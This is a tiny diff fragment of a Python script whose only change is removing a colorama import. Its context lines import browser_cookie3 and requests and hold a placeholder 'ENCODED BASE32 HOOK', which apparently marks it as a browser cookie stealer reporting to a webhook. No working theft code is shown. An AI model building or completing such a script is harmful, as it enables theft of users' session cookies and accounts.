@@ -2,7 +2,6 @@ import browser_cookie3, requests, threading
 import base64
 import time
 import os
-from colorama import Fore
 
 key = "ENCODED BASE32 HOOK HEREEEE"
 
